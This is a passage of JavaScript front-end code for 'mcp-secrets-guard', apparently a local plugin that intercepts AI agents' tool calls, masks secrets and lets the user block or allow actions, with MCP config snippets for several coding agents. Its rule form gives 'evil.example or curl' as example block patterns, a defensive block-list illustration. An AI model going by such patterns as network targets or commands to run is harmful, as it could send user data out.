      post("/config", { notifications: val }).catch(function () {});
    }

    function toggleArena(modeVal) {
      setArenaFps(modeVal);
      post("/config", { arena_mode: modeVal }).catch(function () {});
    }

    const standaloneUrl = "http://127.0.0.1:8765/";
    const mcpConfigJson = JSON.stringify({
      mcpServers: {
        "secrets-guard": {
          command: "python",
          args: ["-m", "src.runtime.policy", "--mcp"],
          env: { MCP_SECRETS_GUARD: "1" }
        }
      }
    }, null, 2);

    return h(React.Fragment, null,
      // Section 1: Language & Interface
      h(Card, { title: currentLang === "ru" ? "язык и интерфейс" : "language & interface", className: "wide" },
        h("div", { style: { display: "flex", gap: 16, flexWrap: "wrap", alignItems: "center" } },
          h("div", { style: { flex: "1 1 200px" } },
            h("div", { className: "yg-sub" }, currentLang === "ru" ? "Язык интерфейса" : "Interface Language"),
            h("div", { className: "yg-kinds" },
              h("button", {
                type: "button", className: "yg-kind" + (currentLang === "ru" ? " on" : ""),
                onClick: function () { setLanguage("ru"); }
              }, "Русский (RU)"),
              h("button", {
                type: "button", className: "yg-kind" + (currentLang === "en" ? " on" : ""),
                onClick: function () { setLanguage("en"); }
              }, "English (EN)")
            )),
          h("div", { style: { flex: "1 1 220px" } },
            h("div", { className: "yg-sub" }, currentLang === "ru" ? "Анимация кибер-арены" : "Cyber Arena Animation"),
            h("div", { className: "yg-kinds" },
              h("button", {
                type: "button", className: "yg-kind" + (arenaFps === "full" ? " on" : ""),
                onClick: function () { toggleArena("full"); }
              }, currentLang === "ru" ? "Активна (60 FPS)" : "Active (60 FPS)"),
              h("button", {
                type: "button", className: "yg-kind" + (arenaFps === "compact" ? " on" : ""),
                onClick: function () { toggleArena("compact"); }
              }, currentLang === "ru" ? "Компактный режим" : "Compact Mode")
            )),
          h("div", { style: { flex: "1 1 220px" } },
            h("div", { className: "yg-sub" }, currentLang === "ru" ? "Уведомления Windows" : "Windows Notifications"),
            h("div", { className: "yg-kinds" },
              h("button", {
                type: "button", className: "yg-kind" + (notifyEnabled ? " on" : ""),
                onClick: function () { toggleNotify(true); }
              }, currentLang === "ru" ? "Включены" : "Enabled"),
              h("button", {
                type: "button", className: "yg-kind" + (!notifyEnabled ? " on" : ""),
                onClick: function () { toggleNotify(false); }
              }, currentLang === "ru" ? "Отключены" : "Disabled")
            ))
        )
      ),

      // Section 2: Protection Policy
      h(Card, { title: currentLang === "ru" ? "политика защиты по умолчанию" : "default protection policy", className: "wide" },
        h("div", { style: { display: "flex", gap: 12, flexWrap: "wrap" } },
          h("div", {
            className: "yg-card",
            style: { flex: 1, cursor: "pointer", borderColor: failClosed ? "var(--yg-good)" : "var(--yg-border)" },
            onClick: function () { toggleFailClosed(true); }
          },
            h("div", { style: { display: "flex", alignItems: "center", gap: 6, fontWeight: 700 } },
              h("span", { style: { color: failClosed ? "var(--yg-good)" : "inherit" } }, failClosed ? "●" : "○"),
              currentLang === "ru" ? "Строгий (Fail-closed) — Рекомендуется" : "Strict (Fail-closed) — Recommended"),
            h("div", { className: "yg-dim yg-small", style: { marginTop: 6 } },
              currentLang === "ru"
                ? "Блокировать любые подозрительные вызовы до явного решения пользователя. Агент ожидает подтверждения."
                : "Block any risky action until user explicitly decides. Agent waits for mandate.")
          ),
          h("div", {
            className: "yg-card",
            style: { flex: 1, cursor: "pointer", borderColor: !failClosed ? "var(--yg-accent)" : "var(--yg-border)" },
            onClick: function () { toggleFailClosed(false); }
          },
            h("div", { style: { display: "flex", alignItems: "center", gap: 6, fontWeight: 700 } },
              h("span", { style: { color: !failClosed ? "var(--yg-accent)" : "inherit" } }, !failClosed ? "●" : "○"),
              currentLang === "ru" ? "Авто-маскировка секретов (Auto-Vault)" : "Auto-Vault Masking"),
            h("div", { className: "yg-dim yg-small", style: { marginTop: 6 } },
              currentLang === "ru"
                ? "Автоматически заменять известные секреты из Сейфа на безопасные токены msg_tok_... и отправлять без задержки."
                : "Automatically replace known secrets from Vault with msg_tok_... and send without prompting.")
          )
        )
      ),

      // Section 3: Universal Multi-Agent Hub
      h(Card, { title: currentLang === "ru" ? "центр подключения агентов (multi-agent hub)" : "multi-agent hub", className: "wide" },
        h("div", { className: "yg-dim yg-small" },
          currentLang === "ru"
            ? "Плагин mcp-secrets-guard работает как внутри Hermes Desktop, так и с любыми другими ИИ-агентами через протокол MCP или автономный веб-пульт."
            : "mcp-secrets-guard integrates natively with Hermes Desktop and connects to any other AI agents via Model Context Protocol or standalone web dashboard."),
        // Standalone Web Dashboard Address Bar
        h("div", { style: { display: "flex", gap: 8, alignItems: "center", margin: "10px 0", background: "rgba(0,0,0,0.4)", padding: "8px 12px", borderRadius: 6, border: "1px solid var(--yg-border)" } },
          h("span", { style: { color: "var(--yg-good)", fontWeight: 700 } }, "🌐 " + (currentLang === "ru" ? "Локальный веб-пульт: " : "Standalone Web URL: ")),
          h("code", { className: "yg-mono", style: { color: "#67e8f9", flex: 1 } }, standaloneUrl),
          h("button", {
            type: "button", className: "yg-btn ghost",
            onClick: function () { copyText(standaloneUrl); }
          }, currentLang === "ru" ? "Скопировать URL" : "Copy URL")
        ),
        // Agent Cards Grid
        h("div", { className: "yg-hub-grid" },
          // Hermes Card
          h("div", { className: "yg-hub-card" },
            h("div", { className: "yg-hub-title" }, "⚡ Hermes Agent"),
            h("div", { className: "yg-hub-desc" },
              currentLang === "ru" ? "Установлен как встроенный плагин десктопа. Перехватывает вызовы на лету." : "Active as desktop plugin. Intercepts tool calls on the fly."),
            h("div", { className: "yg-hub-pre" }, "C:\\Users\\vades\\AppData\\Local\\hermes\\plugins\\yadro-guard"),
            h("button", {
              type: "button", className: "yg-btn ghost", style: { alignSelf: "flex-start" },
              onClick: function () { copyText("C:\\Users\\vades\\AppData\\Local\\hermes\\plugins\\yadro-guard"); }
            }, currentLang === "ru" ? "Скопировать путь" : "Copy Path")
          ),
          // Cline Card
          h("div", { className: "yg-hub-card" },
            h("div", { className: "yg-hub-title" }, "🤖 Cline (VS Code)"),
            h("div", { className: "yg-hub-desc" },
              currentLang === "ru" ? "Добавьте в cline_mcp_settings.json для проверки всех команд терминала." : "Add to cline_mcp_settings.json to audit all terminal commands."),
            h("div", { className: "yg-hub-pre" }, "\"secrets-guard\": { \"command\": \"python\", \"args\": [\"-m\", \"src.runtime.policy\", \"--mcp\"] }"),
            h("button", {
              type: "button", className: "yg-btn ghost", style: { alignSelf: "flex-start" },
              onClick: function () { copyText(mcpConfigJson); }
            }, currentLang === "ru" ? "Скопировать конфиг MCP" : "Copy MCP Config")
          ),
          // Claude Desktop Card
          h("div", { className: "yg-hub-card" },
            h("div", { className: "yg-hub-title" }, "🔮 Claude Desktop / Claude Code"),
            h("div", { className: "yg-hub-desc" },
              currentLang === "ru" ? "Вставьте в claude_desktop_config.json для защиты API-ключей и файлов." : "Add to claude_desktop_config.json to shield keys and files."),
            h("div", { className: "yg-hub-pre" }, "%APPDATA%\\Claude\\claude_desktop_config.json"),
            h("button", {
              type: "button", className: "yg-btn ghost", style: { alignSelf: "flex-start" },
              onClick: function () { copyText(mcpConfigJson); }
            }, currentLang === "ru" ? "Скопировать конфиг MCP" : "Copy MCP Config")
          ),
          // Cursor Card
          h("div", { className: "yg-hub-card" },
            h("div", { className: "yg-hub-title" }, "💻 Cursor"),
            h("div", { className: "yg-hub-desc" },
              currentLang === "ru" ? "Подключение через Cursor Features → MCP Servers." : "Connect via Cursor Features → MCP Servers."),
            h("div", { className: "yg-hub-pre" }, ".cursor/mcp.json"),
            h("button", {
              type: "button", className: "yg-btn ghost", style: { alignSelf: "flex-start" },
              onClick: function () { copyText(mcpConfigJson); }
            }, currentLang === "ru" ? "Скопировать конфиг MCP" : "Copy MCP Config")
          ),
          // Windsurf Card
          h("div", { className: "yg-hub-card" },
            h("div", { className: "yg-hub-title" }, "🌊 Windsurf"),
            h("div", { className: "yg-hub-desc" },
              currentLang === "ru" ? "Подключение в .codeium/windsurf/mcp_config.json." : "Configure in .codeium/windsurf/mcp_config.json."),
            h("div", { className: "yg-hub-pre" }, "~/.codeium/windsurf/mcp_config.json"),
            h("button", {
              type: "button", className: "yg-btn ghost", style: { alignSelf: "flex-start" },
              onClick: function () { copyText(mcpConfigJson); }
            }, currentLang === "ru" ? "Скопировать конфиг MCP" : "Copy MCP Config")
          )
        )
      ),

      // Section 4: Persistent Rules Management
      h(Card, { title: currentLang === "ru" ? "управление постоянными правилами" : "persistent rules management", className: "wide" },
        h("div", { className: "yg-dim yg-small" },
          currentLang === "ru"
            ? "Белые и чёрные списки доменов и инструментов, запомненные пользователем. Правила применяются автоматически до запуска инструментов."
            : "Whitelists and blacklists of domains and tools remembered by user. Applied automatically before tool calls."),
        // Add Rule Form
        h("div", { style: { display: "flex", gap: 8, marginTop: 10, flexWrap: "wrap", alignItems: "center" } },
          h("select", {
            className: "yg-input", style: { flex: "0 0 160px" },
            value: action, onChange: function (e) { setAction(e.target.value); }
          },
            h("option", { value: "block" }, currentLang === "ru" ? "⛔ Блокировать" : "⛔ Block"),
            h("option", { value: "allow" }, currentLang === "ru" ? "✓ Разрешать" : "✓ Allow")
          ),
          h("select", {
            className: "yg-input", style: { flex: "0 0 160px" },
            value: matchType, onChange: function (e) { setMatchType(e.target.value); }
          },
            h("option", { value: "domain" }, currentLang === "ru" ? "Домен (host)" : "Domain (host)"),
            h("option", { value: "tool" }, currentLang === "ru" ? "Инструмент (tool)" : "Tool name")
          ),
          h("input", {
            className: "yg-input", style: { flex: 1 },
            placeholder: currentLang === "ru" ? "Шаблон (например: evil.example или curl)" : "Pattern (e.g. evil.example or curl)",
            value: match, onChange: function (e) { setMatch(e.target.value); }
          }),
          h("button", {
            type: "button", className: "yg-btn", disabled: busyRule === "add" || !match.trim(),
            onClick: addRule
          }, busyRule === "add" ? "…" : (currentLang === "ru" ? "Добавить правило" : "Add Rule"))
        ),
        // Rules Table
        rules.length ? h("table", { className: "yg-table" },
          h("thead", null,
            h("tr", null,
              h("th", null, currentLang === "ru" ? "Действие" : "Action"),
              h("th", null, currentLang === "ru" ? "Тип" : "Type"),
              h("th", null, currentLang === "ru" ? "Шаблон совпадения" : "Match Pattern"),
              h("th", null, currentLang === "ru" ? "Создано" : "Created"),
              h("th", { style: { textAlign: "right" } }, currentLang === "ru" ? "Удалить" : "Delete")
            )
          ),
          h("tbody", null,
            rules.map(function (r, idx) {
              return h("tr", { key: r.id || ("r" + idx) },
                h("td", null, h(Pill, { kind: r.action === "block" ? "bad" : "ok" },
                  r.action === "block" ? (currentLang === "ru" ? "Блокировать" : "Block") : (currentLang === "ru" ? "Разрешать" : "Allow"))),
                h("td", { className: "yg-mono" }, r.match_type),
                h("td", { className: "yg-mono", style: { color: "#67e8f9" } }, r.match),
                h("td", { className: "yg-dim" }, r.created_at ? fmtTs(r.created_at) : "—"),
                h("td", { style: { textAlign: "right" } },
                  h("button", {
                    type: "button", className: "yg-btn ghost yg-trash",
                    disabled: busyRule === (r.id || r.match),
                    title: "Delete",
                    onClick: function () { delRule(r.id, r.match); }
                  }, busyRule === (r.id || r.match) ? "…" : "🗑"))
              );
            })
          )
        ) : h("div", { className: "yg-dim yg-small", style: { marginTop: 10 } },
          currentLang === "ru" ? "Постоянных правил пока нет." : "No persistent rules yet.")
      )
    );
  }

  // =========================================================================
  // MAIN GUARD PAGE (Header RU|EN Switcher, 5 Tabs)
  // =========================================================================
  function GuardPage() {
    const [tab, setTab] = useState("live");
    const [passportOpen, setPassportOpen] = useState(false);
    const [passportBusy, setPassportBusy] = useState("");
    const [incidents, setIncidents] = useState(null);
    const [vault, setVault] = useState(null);
    const [toast, setToast] = useState(null);
    const [toastBusy, setToastBusy] = useState("");
    const [toastNote, setToastNote] = useState("");
    const [lang, setLangState] = useState(currentLang);

    useEffect(function () {
      function onLangChange(newLang) { setLangState(newLang); }
      langListeners.add(onLangChange);
      return function () { langListeners.delete(onLangChange); };
    }, []);

    const alive = useRef(true);
    const seen = useRef(null);
    const queue = useRef([]);
    const lastPending = useRef([]);
    const toastRef = useRef(null);
    const baseTitle = useRef("");

    const showToast = useCallback(function (inc) {
      toastRef.current = inc; setToast(inc); setToastBusy(""); setToastNote("");
    }, []);

    const notify = useCallback(function (inc) {
      try {
        if (typeof Notification === "undefined" || !Notification || Notification.permission !== "granted") return;
        const n = new Notification(T("mcp-secrets-guard blocked an agent"), {
          body: (currentLang === "ru" ? "Агент попытался передать данные через инструмент: " : "Agent attempted to send data via tool: ") +
            (inc.destination ? T(inc.destination).replace(/^команда:\s*/i, "").replace(/^shell:\s*/i, "") : (inc.tool || "?")) +
            ". " + (currentLang === "ru" ? "Откройте Guard для решения." : "Open Guard to decide."),
          tag: "yadro-guard",
        });
        n.onclick = function () { try { window.focus(); } catch (e) {} showToast(inc); };
      } catch (e) {}
    }, [showToast]);

    const promote = useCallback(function () {
      const cur = toastRef.current;
      if (cur) queue.current = queue.current.filter(function (i) { return i.id !== cur.id; });
      if (queue.current.length) return showToast(queue.current[0]);
      const rest = lastPending.current.filter(function (i) { return !cur || i.id !== cur.id; });
      showToast(rest.length ? rest[0] : null);
    }, [showToast]);

    const announce = useCallback(function (d) {
      const items = (d && d.items) || [];
      const pend = items.filter(function (i) { return i.status === "pending"; });
      lastPending.current = pend;
      const open = {};
      pend.forEach(function (i) { open[i.id] = i; });
      queue.current = queue.current.filter(function (i) { return open[i.id]; });
      const ids = pend.map(function (i) { return i.id; });
      if (seen.current === null) { seen.current = ids; return; }
      const fresh = pend.filter(function (i) { return seen.current.indexOf(i.id) < 0; });
      seen.current = ids;
      if (!fresh.length) return;
      queue.current = queue.current.concat(fresh);
      notify(fresh[0]);
      if (!toastRef.current) promote();
    }, [notify, promote]);

    const refresh = useCallback(function () {
      SDK.fetchJSON(API + "/incidents").then(function (d) { if (alive.current) { setIncidents(d); announce(d); } })
        .catch(function () { if (alive.current) setIncidents({ status: "error", message: "Guard backend is not reachable." }); });
      SDK.fetchJSON(API + "/vault").then(function (d) { if (alive.current) setVault(d); }).catch(function () {});
    }, [announce]);

    useEffect(function () {
      alive.current = true; refresh();
      const t = setInterval(function () { if (!document.hidden) refresh(); }, POLL_MS);
      return function () { alive.current = false; clearInterval(t); };
    }, [refresh]);

    useEffect(function () {
      try {
        if (typeof Notification !== "undefined" && Notification.permission === "default" && Notification.requestPermission)
          Notification.requestPermission();
      } catch (e) {}
    }, []);

    useEffect(function () { return function () { try { document.title = baseTitle.current || ""; } catch (e) {} }; }, []);
    const pending = incidents && incidents.pending ? incidents.pending : 0;

    useEffect(function () {
      try {
        if (!baseTitle.current) baseTitle.current = document.title;
        document.title = pending
          ? ("mcp-secrets-guard · " + pending + (currentLang === "ru" ? " заблокировано" : " blocked"))
          : baseTitle.current;
      } catch (e) {}
    }, [pending]);

    useEffect(function () {
      if (!toast) return;
      const t = setTimeout(promote, TOAST_MS);
      return function () { clearTimeout(t); };
    }, [toast, promote]);

    function decide(choice) {
      const inc = toast;
      if (!inc) return;
      setToastBusy(choice); setToastNote("");
      post("/incidents/decide", { incident: inc.id, choice: choice })
        .then(function (r) {
          if (r.status === "ok") {
            lastPending.current = lastPending.current.filter(function (i) { return i.id !== inc.id; });
            refresh(); promote();
          } else { setToastBusy(""); setToastNote(r.message || "Could not save the decision."); }
        })
        .catch(function () { setToastBusy(""); setToastNote("Could not reach the Guard backend."); });
    }

    const TAB_BADGE = {
      display: "inline-block", background: "var(--yg-bad)", color: "#fff",
      borderRadius: "999px", padding: "1px 6px", fontSize: "9px", fontWeight: "700", marginLeft: "4px"
    };

    function TabBtn(id, text, badge) {
      return h("button", {
        className: "yg-tab" + (tab === id ? " on" : ""),
        onClick: function () { setTab(id); },
        title: badge ? badge + " unresolved" : undefined
      }, text, badge ? h("span", { className: "yg-tab-badge", style: TAB_BADGE }, "" + badge) : null);
    }

    return h("div", { className: "yg-root" },
      h("div", { className: "yg-top" },
        h("span", { className: "yg-brand" },
          h("span", { className: "yg-dot " + (pending ? "bad" : "ok") }),
          "mcp-secrets-guard"),
        // Navigation Tabs (5 Tabs)
        h("div", { className: "yg-tabs" },
          TabBtn("live", (currentLang === "ru" ? "Защита" : "Live protection") + (pending ? " (" + pending + ")" : ""), pending),
          TabBtn("exposure", currentLang === "ru" ? "Порты" : "Ports"),
          TabBtn("check", currentLang === "ru" ? "Проверка кода" : "Code Inspector"),
          TabBtn("vault", currentLang === "ru" ? "Сейф" : "Vault"),
          TabBtn("settings", currentLang === "ru" ? "⚙ Настройки" : "⚙ Settings")
        ),
        // Security Passport Dropdown
        h("div", { className: "yg-passport", style: { position: "relative", marginLeft: "auto" } },
          h("button", {
            type: "button", className: "yg-btn ghost", disabled: !!passportBusy,
            title: "Download Security Passport",
            onClick: function () { setPassportOpen(!passportOpen); }
          }, passportBusy ? "… " + passportBusy : (currentLang === "ru" ? "⤓ Паспорт безопасности" : "⤓ Security Passport")),
          passportOpen ? h("div", {
            className: "yg-vault-menu-dropdown", role: "menu",
            style: { position: "absolute", right: 0, top: "100%", zIndex: 60, minWidth: "220px" }
          },
            h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () {
                setPassportOpen(false); setPassportBusy("TXT");
                buildPassport("txt", function () { setPassportBusy(""); });
              }
            }, currentLang === "ru" ? "⤓ Скачать TXT (с Proof Seal)" : "⤓ Download TXT (Proof Seal)"),
            h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () {
                setPassportOpen(false); setPassportBusy("PDF");
                buildPassport("pdf", function () { setPassportBusy(""); });
              }
            }, currentLang === "ru" ? "🖨 Открыть для печати / PDF" : "🖨 Open Print / PDF")
          ) : null),
        // Language Switcher [ RU | EN ] in top right
        h("div", { className: "yg-lang-switch", role: "group", "aria-label": "Language" },
          h("button", {
            type: "button", className: "yg-lang-btn" + (lang === "ru" ? " on" : ""),
            onClick: function () { setLanguage("ru"); }
          }, "RU"),
          h("button", {
            type: "button", className: "yg-lang-btn" + (lang === "en" ? " on" : ""),
            onClick: function () { setLanguage("en"); }
          }, "EN")
        )
      ),

      // Tab Content View
      h("div", { className: "yg-grid" + (tab === "live" ? " live" : "") },
        tab === "live" ? h(LivePanel, { data: incidents, onChanged: refresh }) : null,
        tab === "exposure" ? h(ExposurePanel, null) : null,
        tab === "check" ? h(CheckPanel, null) : null,
        tab === "vault" ? h(VaultPanel, { vault: vault, onChanged: refresh }) : null,
        tab === "settings" ? h(SettingsPanel, null) : null
      ),

      // Toast for backgrounded Hermes notifications
      toast ? h(GuardToast, {
        inc: toast, count: pending, busy: toastBusy, note: toastNote,
        onDecide: decide, onDismiss: promote, onOpen: function () { setTab("live"); promote(); }
      }) : null,


      h("div", { className: "yg-foot" },
        "🔒 mcp-secrets-guard · " + T("Everything runs on this computer. Secrets are masked; the full value appears only while you hold 👁, and every view is logged."))
    );
  }

  function GuardToast(p) {
    const inc = p.inc;
    if (!inc) return null;
    return h("div", {
      className: "yg-card yg-toast",
      style: { position: "fixed", bottom: 20, right: 20, zIndex: 9999, minWidth: 320, maxWidth: 420, boxShadow: "0 10px 40px rgba(0,0,0,0.85)", borderColor: "var(--yg-bad)" }
    },
      h("div", { style: { display: "flex", alignItems: "center", gap: 8, marginBottom: 6 } },
        h("span", { style: { color: "var(--yg-bad)", fontWeight: 700 } }, "⛔ " + (currentLang === "ru" ? "Заблокировано действие агента" : "Agent Action Blocked")),
        h("button", { type: "button", className: "yg-btn ghost yg-right", onClick: p.onDismiss }, "✕")),
      h("div", { className: "yg-dim yg-small" }, (inc.tool || "") + " → " + (inc.destination || "")),
      h("div", { className: "yg-actions", style: { marginTop: 8 } },
        h("button", { className: "yg-btn bad", disabled: !!p.busy, onClick: function () { p.onDecide("block"); } }, currentLang === "ru" ? "Заблокировать" : "Block"),
        h("button", { className: "yg-btn ghost", disabled: !!p.busy, onClick: function () { p.onDecide("allow"); } }, currentLang === "ru" ? "Разрешить" : "Allow"),
        h("button", { className: "yg-btn ghost yg-right", onClick: p.onOpen }, currentLang === "ru" ? "В дашборд" : "Open Guard"))
    );
  }

  onReady(GuardPage);
})(window.__HERMES_PLUGIN_SDK__, function (GuardPage) {
  if (window.__HERMES_PLUGINS__ && typeof window.__HERMES_PLUGINS__.register === "function") {
    window.__HERMES_PLUGINS__.register("yadro-guard", GuardPage);
  }
});
